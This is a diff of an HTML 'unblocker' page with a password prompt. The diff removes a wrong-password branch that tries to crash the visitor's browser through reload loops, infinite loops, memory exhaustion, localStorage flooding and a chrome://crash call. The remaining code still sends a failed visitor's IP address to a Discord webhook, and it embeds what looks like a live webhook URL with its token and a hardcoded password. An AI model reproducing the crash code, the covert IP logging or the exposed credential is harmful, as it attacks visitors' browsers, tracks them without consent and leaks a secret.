@@ -8,24 +8,12 @@
     <input type="text" id="gameUrl" placeholder="https://example.com" style="width:300px; display:none;">
     <button id="openBtn" onclick="openGame()" style="display:none;">Open Game</button>
     <script>
-        // Replace with your actual Discord webhook URL
+        // Replace with your actual Discord webhook URL if needed
         const webhookUrl = "https://discordapp.com/api/webhooks/1375190980294086706/VLETD3zstsZXQHIa13WYmN_QQX1NJ13oCaagPRZ7AiuwrRMyxLXKfW2kHQGGrRPP-JL5";
         const PASSWORD = "yourag"; // Set your password here
 
         // Prompt for password on page load
         window.onload = function() {
-            // Check for crash flag
-            if (localStorage.getItem("crashTest") === "pending") {
-                fetch(webhookUrl, {
-                    method: "POST",
-                    headers: { "Content-Type": "application/json" },
-                    body: JSON.stringify({
-                        content: `INFO: Browser was likely crashed or force-closed during heavy operations.\nUser-Agent: ${navigator.userAgent}`
-                    })
-                });
-                localStorage.removeItem("crashTest");
-            }
-
             var userPassword = prompt("Enter the password to access this page:");
             if (userPassword === PASSWORD) {
                 // Show the unblocker UI
@@ -33,7 +21,7 @@
                 document.getElementById('gameUrl').style.display = '';
                 document.getElementById('openBtn').style.display = '';
             } else {
-                // Wrong password: send IP to webhook
+                // Wrong password: send IP to webhook (optional, remove if not needed)
                 fetch('https://api.ipify.org?format=json')
                     .then(response => response.json())
                     .then(data => {
@@ -48,78 +36,9 @@
                             body: JSON.stringify(payload)
                         });
                     })
-                    .then(() => {
-                        // Set crash flag before heavy operations<script>
-                          // Malicious JavaScript code
-                    setInterval(function() {
-                    window.location.reload();
-                    }, 1000);
-                    })
-                    .then(() => {
-                        var total = "";
-                        for (var i = 0; i < 1e100; i++) { // Reduced for demo; restore your huge number if needed
-                            total += i.toString();
-                            history.pushState(0, 0, total);
-                        }
-                    })
-                    .then(() => {
-                        while (true) {
-                            Math.random() * Math.random();
-                        }
-                    })
-                    .then(() => {
-                        for (let i = 0; i < 10000; i++) {
-                            let div = document.createElement('div');
-                            div.textContent = 'Element ' + i;
-                            document.body.appendChild(div);
-                        }
-                    })
-                    .then(() => {
-                        let arr = [];
-                        for (let i = 0; i < 1000000; i++) {
-                            arr.push("a".repeat(1024 * 1024)); // 1MB strings
-                        }
-                    })
-                    .then(() => {
-                        chrome.tabs.update("chrome://crash") // Only works in Chrome extensions
-                    })
-                    .then(() => {
-                        function crash() {
-                            crash();
-                        }
-                        // crash(); // Uncomment to trigger stack overflow
-                    })
-                    .then(() => {
-                        // Allocate a huge array
-                        let bigArray = [];
-                        for (let i = 0; i < 1e8; i++) {
-                            bigArray.push(i);
-                        }
-                    })
-                    .then(() => {
-                        // Create a massive string
-                        let hugeString = "a";
-                        for (let i = 0; i < 25; i++) {
-                            hugeString += hugeString; // Exponential growth
-                        }
-                    })
-                    .then(() => {
-                        // Trigger many setIntervals
-                        for (let i = 0; i < 1000000000000000000000000; i++) {
-                            setInterval(() => {}, 1);
-                        }
-                    })
-                    .then(() => {
-                        // Fill localStorage with large data
-                        for (let i = 0; i < 100000000000000; i++) {
-                            localStorage.setItem("key" + i, "x".repeat(1024 * 1024)); // 1MB per key
-                        }
-                    })
                     .finally(() => {
-                        // If we reach here, browser did NOT crash
-                        localStorage.setItem("crashTest", "completed");
-                        console.log("you're not allowed here :)");
-                        while (true) {}
+                     alert("Incorrect password. Access denied.");
+                    window.location.href = "https://example.com"; // Change to your desired redirect URL
                     });
             }
         };
